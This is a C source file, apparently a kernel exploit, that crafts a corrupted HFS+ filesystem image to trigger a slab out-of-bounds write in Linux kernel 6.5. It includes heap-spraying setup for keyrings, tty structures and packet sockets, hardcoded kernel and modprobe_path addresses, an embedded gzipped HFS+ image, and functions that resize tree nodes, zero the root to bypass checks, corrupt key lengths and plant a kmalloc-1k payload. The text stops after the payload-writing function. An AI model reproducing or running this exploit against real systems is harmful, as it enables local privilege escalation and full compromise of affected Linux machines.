/*
 * exploit.c
 *
 * Attila Szasz <szasza.contact@gmail.com>
 * @4ttil4sz1a
 *
 * Exploit for hfs+ slab out of bounds write
 * targeting Linux kernel 6.5
 *
 */

#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <stdint.h>
#include <unistd.h>
#include <sched.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/shm.h>
#include <linux/keyctl.h>
#include <stdint.h>
#include <stdbool.h>
#include <time.h>
#include <zlib.h>
#include <endian.h>
#include <stdint.h>
#include <linux/types.h>
#include <errno.h>
#include <sys/mount.h>
#include <pwd.h>
#include <grp.h>
#include <semaphore.h>


#define KEY_DESC_MAX_SIZE 900
#define XATTR_NAME_MAX_SIZE 1024
#define MODPROBE_PATH "/proc/sys/kernel/modprobe"
#define BUFFER_SIZE 256

/*
#define DEBUG_CROSSCACHE 1
*/

/* see security/keys/key.c */
#define SPRAY_KEY_SIZE 13
#define SPRAY_KEY_SIZE_INIT 6
#define SPRAY_TTY_INITIAL 6
#define SPRAY_TTY_SIZE 9
#define SPRAY_XATTR_SIZE_MODPROBE 15

#define do_error_exit(msg) do {perror("[-] " msg); exit(EXIT_FAILURE); } while (0)

#define KERNEL_BASE_LOWER 0xffffffff80000000
#define KERNEL_BASE_UPPER 0xffffffffc0000000

#define OFFSET_2ND_PTR 0x230
#define OFFSET_3RD_PTR (OFFSET_2ND_PTR + (0x60))

#define BASE_ADDR_FIRST  0xffffffff82284be0
#define BASE_ADDR_SECOND 0xffffffff81631bc0
#define BASE_ADDR_THIRD  0xffffffff81633e30

#define MODPROBE_ADDR_ONE 0xffffffff82b3f638
#define MODPROBE_ADDR_TWO 0xffffffff82b3f63c

#define KERNEL_BASE 0xffffffff81000000

#define PIPE_SPRAY_NUM 20

#define PGV_1PAGE_SPRAY_NUM 0x100

#define PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM
#define PGV_4PAGES_SPRAY_NUM 0x100

#define PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)
#define PGV_8PAGES_SPRAY_NUM 0x100

int pgv_1page_start_idx;
int pgv_4pages_start_idx = PGV_4PAGES_START_IDX;
int pgv_8pages_start_idx = PGV_8PAGES_START_IDX;

uint64_t kaslr_base_recovered;

#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* Each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

/* Operations type */
enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* Tpacket version for setsockopt */
enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

typedef int32_t key_serial_t;

#define CHUNK 16384

#define __packed __attribute__((packed))

#define HFSPLUS_ATTR_MAX_STRLEN 127

typedef __be32 hfsplus_cnid;
typedef __be16 hfsplus_unichr;
typedef __u32 u32;
typedef __u16 u16;
typedef __u8 u8;
typedef __s8 s8;

struct write4_payload {
    void *next;
    void *prev;
    uint8_t name_offset;
} __attribute__((packed));

uint64_t get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size);

void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size);

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
{
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
{
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

void set_cpu_affinity(int cpu_n, pid_t pid);

void spray_tty_struct(int num);

key_serial_t *spray_keyring(uint32_t spray_size, uint32_t offset);


struct hfsplus_attr_unistr {
    __be16 length;
    hfsplus_unichr unicode[HFSPLUS_ATTR_MAX_STRLEN];
} __packed;

/* HFS+ attributes tree key */
struct hfsplus_attr_key {
    __be16 key_len;
    __be16 pad;
    hfsplus_cnid cnid;
    __be32 start_block;
    struct hfsplus_attr_unistr key_name;
} __packed;

#define HFSPLUS_ATTR_KEYLEN    sizeof(struct hfsplus_attr_key)

/* A single contiguous area of a file */
struct hfsplus_extent {
    __be32 start_block;
    __be32 block_count;
} __packed;
typedef struct hfsplus_extent hfsplus_extent_rec[8];

/* Information for a "Fork" in a file */
struct hfsplus_fork_raw {
    __be64 total_size;
    __be32 clump_size;
    __be32 total_blocks;
    hfsplus_extent_rec extents;
} __packed;

/* HFS+ Volume Header */
struct hfsplus_vh {
    __be16 signature;
    __be16 version;
    __be32 attributes;
    __be32 last_mount_vers;
    u32 reserved;

    __be32 create_date;
    __be32 modify_date;
    __be32 backup_date;
    __be32 checked_date;

    __be32 file_count;
    __be32 folder_count;

    __be32 blocksize;
    __be32 total_blocks;
    __be32 free_blocks;

    __be32 next_alloc;
    __be32 rsrc_clump_sz;
    __be32 data_clump_sz;
    hfsplus_cnid next_cnid;

    __be32 write_count;
    __be64 encodings_bmp;

    u32 finder_info[8];

    struct hfsplus_fork_raw alloc_file;
    struct hfsplus_fork_raw ext_file;
    struct hfsplus_fork_raw cat_file;
    struct hfsplus_fork_raw attr_file;
    struct hfsplus_fork_raw start_file;
} __packed;


/* HFS+ BTree node descriptor */
struct hfs_bnode_desc {
    __be32 next;
    __be32 prev;
    s8 type;
    u8 height;
    __be16 num_recs;
    u16 reserved;
} __packed;

/* HFS+ BTree node types */
#define HFS_NODE_INDEX    0x00    /* An internal (index) node */
#define HFS_NODE_HEADER    0x01    /* The tree header node (node 0) */
#define HFS_NODE_MAP    0x02    /* Holds part of the bitmap of used nodes */
#define HFS_NODE_LEAF    0xFF    /* A leaf (ndNHeight==1) node */

/* HFS+ BTree header */
struct hfs_btree_header_rec {
    __be16 depth;
    __be32 root;
    __be32 leaf_count;
    __be32 leaf_head;
    __be32 leaf_tail;
    __be16 node_size;
    __be16 max_key_len;
    __be32 node_count;
    __be32 free_nodes;
    u16 reserved1;
    __be32 clump_size;
    u8 btree_type;
    u8 key_type;
    __be32 attributes;
    u32 reserved3[16];
} __packed;

#define HFS_TREE_BIGKEYS    2
#define HFS_TREE_VARIDXKEYS    4


/* Gzipped vanilla HFS+ that we are going to corrupt */
unsigned char vanilla_hfs_bin[] = {
  0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x5d, 0x90,
  0x79, 0x54, 0x12, 0x06, 0x00, 0xc6, 0xc1, 0xca, 0xb9, 0xe9, 0x6c, 0x79,
  0x65, 0xb4, 0xe4, 0xe5, 0xc9, 0x4c, 0xd3, 0xcc, 0x7c, 0x6a, 0xa5, 0x5b,
  0x4c, 0x4b, 0x9c, 0x4f, 0x53, 0xf7, 0x3c, 0x40, 0xb7, 0x28, 0x73, 0xa4,
  0x50, 0x1e, 0x80, 0x07, 0x1e, 0xaf, 0x56, 0x21, 0x4d, 0xe9, 0x52, 0xd3,
  0x54, 0x40, 0x43, 0x49, 0xc4, 0x32, 0x52, 0x1a, 0x82, 0x69, 0x86, 0x28,
  0x1e, 0x25, 0x79, 0x2b, 0xa0, 0x79, 0xe0, 0x81, 0x52, 0x98, 0x47, 0x5e,
  0xec, 0xad, 0xf7, 0xb6, 0xb4, 0xef, 0xdf, 0xdf, 0x1f, 0xdf, 0xef, 0xfb,
  0xc0, 0x37, 0xb4, 0x00, 0x9f, 0xb2, 0x6d, 0x76, 0x08, 0xee, 0x17, 0x88,
  0x05, 0x08, 0xdf, 0x67, 0x3e, 0x95, 0x18, 0xdb, 0xfd, 0x40, 0x32, 0x22,
  0xfe, 0x05, 0x31, 0xb8, 0x36, 0x40, 0xb5, 0x1f, 0x8e, 0xa0, 0x82, 0x74,
  0xaa, 0xf3, 0x03, 0xdf, 0x35, 0x69, 0xdd, 0x45, 0x12, 0x21, 0xa6, 0x15,
  0x1a, 0x97, 0xd3, 0xf5, 0xa4, 0xb8, 0x67, 0xf7, 0x46, 0xfe, 0xdc, 0x4e,
  0x32, 0xa5, 0x69, 0x19, 0x13, 0x2b, 0x5f, 0x58, 0xfb, 0x73, 0x4d, 0x8d,
  0xf5, 0x68, 0x5a, 0x2f, 0xc6, 0x40, 0xa0, 0xa5, 0xc1, 0x58, 0xa6, 0xe4,
  0x9c, 0x90, 0x53, 0x74, 0xa1, 0xcc, 0xe5, 0xcd, 0x87, 0xf5, 0x63, 0x85,
  0x79, 0x71, 0x13, 0x6d, 0x4b, 0x05, 0x72, 0xd9, 0x5a, 0x99, 0xc9, 0xed,
  0x53, 0xe2, 0xcb, 0x4d, 0xd1, 0x7a, 0x7c, 0x85, 0x92, 0x2f, 0x88, 0x84,
  0x53, 0xd5, 0x4d, 0xdf, 0x16, 0xb9, 0xd5, 0xd5, 0x6a, 0x68, 0xa4, 0xd0,
  0xd9, 0x1a, 0x7c, 0x3c, 0x29, 0xf4, 0x82, 0x12, 0x13, 0x3e, 0x72, 0xec,
  0xa7, 0xa1, 0xbe, 0x61, 0x4a, 0xb6, 0x92, 0xe7, 0x42, 0x85, 0xe1, 0xd2,
  0x72, 0x86, 0x18, 0x8e, 0x96, 0x6d, 0xa9, 0x39, 0x27, 0x5f, 0x1d, 0x95,
  0x5b, 0x16, 0xd8, 0x9b, 0x18, 0xc0, 0x15, 0x41, 0x16, 0x0a, 0x29, 0x07,
  0x62, 0xd9, 0x1c, 0x37, 0xed, 0xd8, 0x92, 0x70, 0x80, 0xae, 0x88, 0x6d,
  0x23, 0x8a, 0xc5, 0x76, 0x07, 0x9d, 0x88, 0x67, 0xd1, 0xac, 0x39, 0xe7,
  0x3e, 0x6b, 0x7a, 0x46, 0x71, 0xdd, 0xf4, 0x75, 0x9f, 0xa8, 0x01, 0x5f,
  0xf8, 0x75, 0xc8, 0x04, 0xa5, 0x35, 0x24, 0xad, 0xaa, 0x8f, 0xcd, 0xc0,
  0x35, 0x9f, 0xf1, 0x11, 0xc3, 0x42, 0x56, 0x48, 0xe3, 0x2e, 0x74, 0xaf,
  0x22, 0x18, 0x96, 0x55, 0x3e, 0xbd, 0xbb, 0x77, 0xdb, 0x0e, 0x9a, 0xc9,
  0xfc, 0x00, 0x39, 0x37, 0x9b, 0xbc, 0xef, 0x9b, 0xc3, 0x5e, 0xf9, 0x6a,
  0xe7, 0x28, 0x41, 0x7b, 0x17, 0x07, 0xa7, 0x83, 0xc2, 0xec, 0x8e, 0x7e,
  0x1e, 0x33, 0x8e, 0xae, 0xad, 0x69, 0x60, 0xde, 0xc8, 0x4d, 0x65, 0x8b,
  0xce, 0x77, 0x06, 0xdf, 0x3a, 0x15, 0x30, 0x35, 0x7e, 0x6c, 0xaa, 0xa2,
  0x89, 0xfa, 0xb8, 0xc3, 0xf7, 0x10, 0xdc, 0x5c, 0x0f, 0x75, 0x9c, 0x19,
  0x24, 0x5f, 0x5d, 0x76, 0x2f, 0x94, 0x82, 0x56, 0x5e, 0xf3, 0xf0, 0xa5,
  0xc9, 0x9e, 0xc9, 0x09, 0xb4, 0xd5, 0x9a, 0x69, 0xaf, 0x57, 0x17, 0x3d,
  0xf2, 0xe3, 0x11, 0xb0, 0xcc, 0x9b, 0xee, 0xc1, 0x83, 0xb5, 0x7e, 0xdb,
  0x87, 0xd5, 0xe6, 0xb1, 0x90, 0x94, 0x96, 0x01, 0x61, 0xdc, 0xce, 0x45,
  0x6b, 0xe8, 0xac, 0xa4, 0x92, 0xd1, 0x03, 0x6e, 0xce, 0x1b, 0xe9, 0x63,
  0x66, 0x55, 0xcb, 0xe2, 0x46, 0x33, 0x08, 0x58, 0x65, 0xf3, 0x6e, 0xdf,
  0x44, 0xbe, 0xf5, 0x3e, 0x02, 0xce, 0xd2, 0x65, 0x10, 0x7b, 0xa6, 0xb4,
  0xd5, 0xa9, 0x3d, 0x2c, 0x57, 0xb9, 0x4a, 0x9e, 0xab, 0x42, 0xc7, 0x42,
  0xf0, 0x1b, 0x8c, 0xa8, 0xd0, 0x55, 0x5d, 0x72, 0x85, 0x59, 0xeb, 0x53,
  0xbb, 0xf6, 0x29, 0x54, 0x05, 0x98, 0x51, 0x11, 0xed, 0xff, 0xb1, 0x74,
  0x95, 0x1e, 0xa4, 0x09, 0x26, 0x0f, 0x3a, 0x2b, 0x45, 0xa5, 0x2f, 0x44,
  0xe5, 0xac, 0xe3, 0x42, 0xca, 0x58, 0xf9, 0x62, 0xb8, 0xae, 0xb2, 0xf2,
  0x92, 0xcd, 0x51, 0xfd, 0x65, 0x86, 0x40, 0x21, 0xf0, 0xb6, 0xb3, 0x38,
  0xc9, 0xe8, 0x69, 0x81, 0x46, 0x37, 0x56, 0x23, 0x69, 0x75, 0x26, 0x80,
  0xff, 0x52, 0xff, 0xdb, 0xcf, 0x84, 0xa5, 0x7e, 0x9f, 0x99, 0x59, 0x65,
  0x9a, 0x83, 0x8b, 0xff, 0x7d, 0x87, 0xce, 0x97, 0xdd, 0xa3, 0x7e, 0x37,
  0xab, 0xaa, 0xba, 0x96, 0x2e, 0x3d, 0x9f, 0xcc, 0x9e, 0x62, 0xfa, 0xf2,
  0x6b, 0xe0, 0x8e, 0x98, 0xb7, 0x0c, 0x0b, 0x4d, 0xd1, 0x7b, 0xa5, 0xa8,
  0xb0, 0x92, 0x05, 0x92, 0xe7, 0x5f, 0x4a, 0x46, 0xe7, 0x36, 0xb0, 0x25,
  0xa7, 0xfb, 0xcd, 0x42, 0xd9, 0xf2, 0xb9, 0x0f, 0xfd, 0x79, 0xcf, 0xdc,
  0x47, 0xe6, 0xaf, 0xac, 0x62, 0x16, 0x32, 0xb3, 0xb0, 0xc4, 0x14, 0x3e,
  0xab, 0x83, 0xe6, 0xe7, 0xe6, 0x35, 0xb9, 0x53, 0xe3, 0x53, 0x81, 0x1a,
  0x31, 0x2a, 0x19, 0x7e, 0x59, 0x93, 0x45, 0xf1, 0xc6, 0x5b, 0x2c, 0xd9,
  0xe6, 0x66, 0x56, 0xaa, 0x96, 0x55, 0x53, 0x9d, 0xa9, 0x42, 0xbf, 0x4c,
  0xf9, 0x5a, 0x03, 0xa8, 0x44, 0xce, 0x31, 0x33, 0x0c, 0x0f, 0xd3, 0xce,
  0x3f, 0x71, 0x1b, 0xb9, 0xde, 0x08, 0x5e, 0x2e, 0x4f, 0x2e, 0xaf, 0xab,
  0x06, 0x3b, 0x84, 0xc6, 0xc9, 0x25, 0x0d, 0x56, 0xb4, 0xaf, 0x17, 0x32,
  0x3c, 0x44, 0xb4, 0x1d, 0xa2, 0x86, 0xac, 0x96, 0x09, 0x4c, 0xc0, 0x62,
  0x38, 0x66, 0xe6, 0x83, 0xd8, 0xd1, 0xd5, 0xf7, 0x61, 0x08, 0xcf, 0x2a,
  0x30, 0xc9, 0x33, 0xd1, 0xb9, 0x83, 0xde, 0x5d, 0xc9, 0xe5, 0xed, 0xc7,
  0xce, 0x94, 0x8c, 0xc1, 0xfd, 0xe9, 0xeb, 0x57, 0xcd, 0xfa, 0xe1, 0x84,
  0xe8, 0xf3, 0xf8, 0xc8, 0x6e, 0x43, 0xa9, 0x5b, 0x71, 0x78, 0xa2, 0x78,
  0x23, 0x18, 0x7a, 0x45, 0x56, 0x26, 0x9d, 0x5e, 0x53, 0x3d, 0xd1, 0x65,
  0xee, 0x5d, 0x07, 0x0a, 0xad, 0xf5, 0x53, 0x21, 0xf9, 0x77, 0xcc, 0x29,
  0x7b, 0x82, 0x10, 0x01, 0x46, 0xaa, 0x5f, 0x17, 0x2e, 0x93, 0x22, 0xe6,
  0xc2, 0x54, 0x54, 0x5d, 0x75, 0xe4, 0x1c, 0xa9, 0xc8, 0x27, 0xc7, 0xdb,
  0x9d, 0xc7, 0x78, 0xe8, 0x4f, 0x40, 0x0c, 0xf7, 0xca, 0x10, 0xc3, 0x31,
  0xd8, 0xc4, 0x45, 0x25, 0xdc, 0xf6, 0x4a, 0x75, 0xbb, 0xa7, 0xd5, 0xbc,
  0xc3, 0xd8, 0xfe, 0xb2, 0xb4, 0x99, 0xd6, 0x67, 0xf8, 0xba, 0x47, 0x1b,
  0xbd, 0x87, 0x4c, 0x3b, 0x8f, 0xec, 0xe5, 0x74, 0xb1, 0x77, 0xf1, 0x83,
  0x6a, 0x23, 0x1f, 0xe0, 0xb0, 0xd2, 0xae, 0x5f, 0x0c, 0x57, 0x94, 0x9f,
  0xe6, 0xa6, 0xa7, 0x41, 0x63, 0x8a, 0x82, 0xa3, 0xed, 0x09, 0x23, 0x0f,
  0x5a, 0x6e, 0xd1, 0x23, 0x80, 0xff, 0xff, 0x0c, 0x48, 0x57, 0x73, 0xf5,
  0x0e, 0x07, 0x64, 0x60, 0x0c, 0xed, 0xa9, 0x8f, 0x6f, 0x18, 0xb9, 0x6a,
  0x7e, 0x26, 0x80, 0xc9, 0x76, 0x7b, 0x9b, 0x7a, 0x04, 0x67, 0x87, 0x1f,
  0x2a, 0xca, 0xe2, 0x84, 0x70, 0x13, 0x00, 0xf0, 0x43, 0x38, 0x08, 0xb2,
  0x18, 0x0d, 0x7c, 0x5b, 0x9d, 0x6a, 0x94, 0x77, 0xa2, 0x77, 0x0b, 0x1a,
  0x27, 0x09, 0x34, 0x1b, 0xe1, 0x00, 0x2b, 0x9f, 0x2c, 0x1b, 0x9f, 0x49,
  0xe3, 0x4d, 0x84, 0xca, 0xf9, 0xb7, 0x68, 0xee, 0xf7, 0x74, 0xe0, 0xd5,
  0xb0, 0xa7, 0xaf, 0x0f, 0x6d, 0x22, 0x3f, 0x5e, 0xbc, 0x76, 0x06, 0x38,
  0xc1, 0xb5, 0x4d, 0x87, 0xc1, 0x0f, 0xec, 0xfa, 0x42, 0x81, 0x3b, 0x9e,
  0x74, 0x17, 0xa3, 0xfd, 0xdd, 0xa3, 0x05, 0x76, 0xb3, 0x01, 0x77, 0x0b,
  0xb2, 0x0d, 0xb2, 0x71, 0x32, 0x96, 0x6a, 0x38, 0xa3, 0x62, 0xcf, 0xa1,
  0xbe, 0xd0, 0xcb, 0xbe, 0x97, 0x07, 0x8b, 0xff, 0x6a, 0x9b, 0x0e, 0x44,
  0x51, 0x7c, 0x35, 0x6b, 0xd3, 0x58, 0x40, 0xd2, 0x61, 0x1d, 0x6d, 0xfb,
  0x5e, 0x34, 0x30, 0x70, 0x20, 0x34, 0xe3, 0x0b, 0x85, 0x1e, 0xdb, 0xde,
  0x92, 0x78, 0x78, 0x7a, 0x02, 0x8b, 0xe2, 0x51, 0xfa, 0xfa, 0xc8, 0x16,
  0xf4, 0x37, 0xb2, 0xaa, 0xe1, 0x9d, 0x51, 0xbd, 0xd7, 0x1d, 0x33, 0x6f,
  0xfd, 0xad, 0x7a, 0xb3, 0xd2, 0x12, 0x6e, 0xfc, 0xfc, 0x69, 0x33, 0x9e,
  0xc7, 0x82, 0xc3, 0x59, 0xe8, 0x28, 0x4f, 0xfb, 0x63, 0xa2, 0xe7, 0x5e,
  0x12, 0x12, 0x59, 0xe1, 0x7a, 0x72, 0xcf, 0xd1, 0x02, 0xb7, 0xee, 0x48,
  0x10, 0x5a, 0x25, 0x25, 0xeb, 0xeb, 0x36, 0x0d, 0x3a, 0x2a, 0x16, 0x7a,
  0x56, 0x0c, 0xc8, 0x06, 0x9f, 0x6d, 0xea, 0x65, 0xaa, 0x89, 0xd1, 0xb5,
  0x2a, 0x49, 0x0e, 0x1d, 0xd8, 0x8a, 0x4c, 0x83, 0xa1, 0x96, 0xb2, 0x9d,
  0x2e, 0xd6, 0xc9, 0x1c, 0xa1, 0x85, 0x7a, 0x04, 0xe9, 0x93, 0x52, 0x3c,
  0xc2, 0xcb, 0xf3, 0x0f, 0x7e, 0x12, 0x2e, 0x6e, 0x88, 0xbe, 0xd1, 0x13,
  0x88, 0x22, 0x42, 0x6b, 0x63, 0x98, 0xae, 0x02, 0xb4, 0x02, 0x5c, 0x78,
  0x04, 0x5b, 0x74, 0x70, 0xd0, 0x97, 0xb0, 0x7e, 0x2d, 0x45, 0xc0, 0xcd,
  0x30, 0xbc, 0x5e, 0xce, 0x7d, 0xf3, 0x96, 0x45, 0xf8, 0xfe, 0xbe, 0x5b,
  0xc2, 0x86, 0x53, 0x0b, 0xe5, 0x61, 0x41, 0xa2, 0x8c, 0xae, 0x06, 0x02,
  0xfe, 0x01, 0x5a, 0x8c, 0xfd, 0x33, 0x35, 0x05, 0x00, 0x00
};
unsigned int vanilla_hfs_bin_len = 1258;


/* HFS+ epoch starts on January 1, 1904 */
#define HFSPLUS_EPOCH_DIFF 2082844800 /* Difference between HFS+ and Unix epoch in seconds (1904-1970) */

/* Function to convert HFS+ timestamp to Unix timestamp and then to a human-readable date */
void hfsplus_to_date(unsigned int hfsplus_timestamp)
{
    /* Convert HFS+ timestamp to Unix timestamp */
    time_t unix_timestamp = hfsplus_timestamp - HFSPLUS_EPOCH_DIFF;

    /* Convert the Unix timestamp to local time */
    struct tm *tm_info = localtime(&unix_timestamp);

    if (tm_info == NULL) {
        printf("Failed to convert timestamp\n");
        return;
    }

    /* Output the formatted date */
    char buffer[80];

    strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", tm_info);
    printf("%s\n", buffer);
}

void parse_tree(struct hfs_btree_header_rec *tree)
{
    struct hfs_bnode_desc *header_node = (struct hfs_bnode_desc *)((void *)tree - sizeof(struct hfs_bnode_desc));

    printf("\tHeader node next: 0x%x\n", be32toh(header_node->next));
    printf("\tHeader node prev: 0x%x\n", be32toh(header_node->prev));
    printf("\tHeader node type: ");
    if (header_node->type == HFS_NODE_HEADER)
        printf("HFS_NODE_HEADER\n");
    else
        printf("0x%x\n", header_node->type);

    printf("\tHeader node number of records: 0x%x\n", be16toh(header_node->num_recs));

    printf("\tDepth: 0x%x\n", be16toh(tree->depth));
    printf("\tRoot: 0x%x\n", be32toh(tree->root));
    printf("\tNode size: 0x%x\n", be16toh(tree->node_size));
    printf("\tMax key length: 0x%x\n", be16toh(tree->max_key_len));
    printf("\tNode count: 0x%x\n", be32toh(tree->node_count));
    printf("\tAttributes:\n");
    if (be32toh(tree->attributes) & HFS_TREE_BIGKEYS)
        printf("\t\tHFS_TREE_BIGKEYS\n");
    if (be32toh(tree->attributes) & HFS_TREE_VARIDXKEYS)
        printf("\t\tHFS_TREE_VARIDXKEYS\n");
}


void parse_volume(const unsigned char *hfs_buffer, size_t len)
{
    struct hfsplus_vh *hfs_vh = (struct hfsplus_vh *)(hfs_buffer+0x400);

    printf("[+] Basic information about hfs+ volume\n");
    printf("\tSignature: 0x%x\n", be16toh(hfs_vh->signature));
    printf("\tVersion: 0x%x\n", be16toh(hfs_vh->version));
    printf("\tCreation date: ");
    hfsplus_to_date(be32toh(hfs_vh->create_date));
    printf("\tBlock size: 0x%x\n", be32toh(hfs_vh->blocksize));
    printf("\tTotal blocks: 0x%x\n", be32toh(hfs_vh->total_blocks));
    printf("\tNext cnid: 0x%x\n", be32toh(hfs_vh->next_cnid));


    printf("[+] Checking catalog and attribute btrees\n");
    printf("\tCatalog start block: 0x%x\n", be32toh(hfs_vh->cat_file.extents->start_block));
    printf("\tCatalog block count: 0x%x\n", be32toh(hfs_vh->cat_file.extents->block_count));

    printf("\tAttribute start block: 0x%x\n", be32toh(hfs_vh->attr_file.extents->start_block));
    printf("\tAttrbiute block count: 0x%x\n", be32toh(hfs_vh->attr_file.extents->block_count));

    size_t blocksize = be32toh(hfs_vh->blocksize);

    size_t cat_tree_start_address = be32toh(hfs_vh->attr_file.extents->start_block) * blocksize;

    cat_tree_start_address += sizeof(struct hfs_bnode_desc);
    struct hfs_btree_header_rec *cat_tree = (struct hfs_btree_header_rec *)(hfs_buffer+cat_tree_start_address);


    size_t attr_tree_start_address = be32toh(hfs_vh->attr_file.extents->start_block) * blocksize;

    attr_tree_start_address += sizeof(struct hfs_bnode_desc);
    struct hfs_btree_header_rec *attr_tree = (struct hfs_btree_header_rec *)(hfs_buffer+attr_tree_start_address);


    printf("[+] Parsing basic stuff about catalog file\n");
    parse_tree(cat_tree);

    printf("[+] Parsing basic stuff about attribute file\n");
    parse_tree(attr_tree);

}


void resize_nodes(unsigned char *hfs_buffer, size_t len)
{
    uint8_t footer_node[] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x77, 0x00,
    0x76, 0x00, 0x75, 0x00, 0x74, 0x42, 0x00, 0x0e
    };

    struct hfsplus_vh *hfs_vh = (struct hfsplus_vh *)(hfs_buffer+0x400);
    size_t blocksize = be32toh(hfs_vh->blocksize);
    size_t attr_tree_start_address_base = be32toh(hfs_vh->attr_file.extents->start_block) * blocksize;
    size_t attr_tree_start_address = attr_tree_start_address_base + sizeof(struct hfs_bnode_desc);
    struct hfs_btree_header_rec *attr_tree = (struct hfs_btree_header_rec *)(hfs_buffer+attr_tree_start_address);

    printf("[+] Resizing attribute tree nodes to make same space for machinery\n");
    printf("\tNode size: 0x%x\n", be16toh(attr_tree->node_size));

    /* Let's have a bigger node size so we can fit our payloads nicely */
    attr_tree->node_size = htobe16(0x8000);

    printf("\tNode size (corrupted): 0x%x\n", be16toh(attr_tree->node_size));

    /* The node footer has to go to the new place */
    unsigned char *dest_address = hfs_buffer + attr_tree_start_address_base + (0x8000-0x10);
    unsigned char *src_address = hfs_buffer + attr_tree_start_address_base + (0x2000-0x10);

    printf("\tOriginal footer at: 0x%lx\n", (unsigned long)src_address);
    printf("\tNew footer at: 0x%lx\n", (unsigned long)dest_address);

    printf("\tOriginal footer at (relative): 0x%lx\n", (unsigned long)src_address - (unsigned long)hfs_buffer);
    printf("\tNew footer at (relative): 0x%lx\n", (unsigned long)dest_address - (unsigned long)hfs_buffer);

    memcpy(dest_address, src_address, 0x10);

    /* The target node footer is given by us */
    unsigned char *dest_address_node = hfs_buffer + attr_tree_start_address_base + (2 * 0x8000 - 0x10);

    memcpy(dest_address_node, &footer_node, 0x10);


    /* The node footer has to go to the new place */
    unsigned char *src_address_data = hfs_buffer + attr_tree_start_address_base + 0x2000;
    unsigned char *dest_address_data = hfs_buffer + attr_tree_start_address_base + 0x8000;

    printf("\tOriginal attribute records at: 0x%lx\n", (unsigned long)src_address_data);
    printf("\tNew attribute records at: 0x%lx\n", (unsigned long)dest_address_data);

    memcpy(dest_address_data, src_address_data, 0x200);
}

void remove_root(unsigned char *hfs_buffer, size_t len)
{
    struct hfsplus_vh *hfs_vh = (struct hfsplus_vh *)(hfs_buffer+0x400);
    size_t blocksize = be32toh(hfs_vh->blocksize);
    size_t attr_tree_start_address_base = be32toh(hfs_vh->attr_file.extents->start_block) * blocksize;
    size_t attr_tree_start_address = attr_tree_start_address_base + sizeof(struct hfs_bnode_desc);
    struct hfs_btree_header_rec *attr_tree = (struct hfs_btree_header_rec *)(hfs_buffer+attr_tree_start_address);

    printf("[+] Removing root to bypass hfs_brec_find checks\n");

    printf("\tRoot: 0x%x\n", be32toh(attr_tree->root));

    /* Let's zero out the root to bypass checks */
    attr_tree->root = htobe32(0x0);

    printf("\tRoot (corrupted): 0x%x\n", be16toh(attr_tree->root));
}


void corrupt_key_len(unsigned char *hfs_buffer, size_t len, uint16_t new_length)
{
    struct hfsplus_vh *hfs_vh = (struct hfsplus_vh *)(hfs_buffer+0x400);
    size_t blocksize = be32toh(hfs_vh->blocksize);
    size_t attr_tree_start_address_base = be32toh(hfs_vh->attr_file.extents->start_block) * blocksize;
    size_t attr_tree_start_address = attr_tree_start_address_base + sizeof(struct hfs_bnode_desc);
    struct hfs_btree_header_rec *attr_tree = (struct hfs_btree_header_rec *)(hfs_buffer+attr_tree_start_address);
    unsigned char *address_node = hfs_buffer + attr_tree_start_address_base + 0x8000;

    printf("[+] Corrupting HFS attribute record key length\n");

    struct hfs_bnode_desc *first_node = (struct hfs_bnode_desc *)address_node;

    printf("\tNode next: 0x%x\n", be32toh(first_node->next));
    printf("\tNode prev: 0x%x\n", be32toh(first_node->prev));
    printf("\tNode type: ");
    if (first_node->type == HFS_NODE_HEADER)
        printf("HFS_NODE_HEADER\n");
    else
        printf("0x%x\n", first_node->type);

    printf("\tNode number of records: 0x%x\n", be16toh(first_node->num_recs));

    struct hfsplus_attr_key *first_key = (struct hfsplus_attr_key *)(address_node + sizeof(struct hfs_bnode_desc));

    printf("\tKey length (current): 0x%x\n", be16toh(first_key->key_len));
    first_key->key_len = htobe16(new_length);

    printf("\tKey length (corrupted): 0x%x\n", be16toh(first_key->key_len));
}


void write_payload(unsigned char *hfs_buffer, size_t len, uint8_t *payload, uint16_t payload_length)
{
    struct hfsplus_vh *hfs_vh = (struct hfsplus_vh *)(hfs_buffer+0x400);
    size_t blocksize = be32toh(hfs_vh->blocksize);
    size_t attr_tree_start_address_base = be32toh(hfs_vh->attr_file.extents->start_block) * blocksize;
    size_t attr_tree_start_address = attr_tree_start_address_base + sizeof(struct hfs_bnode_desc);
    struct hfs_btree_header_rec *attr_tree = (struct hfs_btree_header_rec *)(hfs_buffer+attr_tree_start_address);
    unsigned char *address_node = hfs_buffer + attr_tree_start_address_base + 0x8000;
    struct hfsplus_attr_key *first_key = (struct hfsplus_attr_key *)(address_node + sizeof(struct hfs_bnode_desc));

    printf("[+] Writing kmalloc-1k payload\n");

    /* Make some 'A' padding */
    memset((void *)first_key + 0xd7, 0x41, 4*0x400);

    uint8_t *address = (uint8_t *)(address_node + sizeof(struct hfs_bnode_desc) + 0x400);

    memcpy(address, payload, payload_length);
}

